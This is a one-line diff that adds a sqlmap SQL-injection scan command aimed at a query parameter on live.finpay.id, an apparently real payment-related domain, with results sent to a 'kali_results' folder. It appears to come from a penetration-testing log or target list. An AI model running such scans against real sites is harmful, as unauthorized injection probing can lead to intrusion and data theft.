@@ -1,0 +1,1 @@
+http://live.finpay.id?cat=1 (GET)  # /usr/bin/sqlmap -u http://live.finpay.id?cat=1 --batch --level 2 --risk 1 --output-dir=kali_results/sqlmap_live.finpay.id
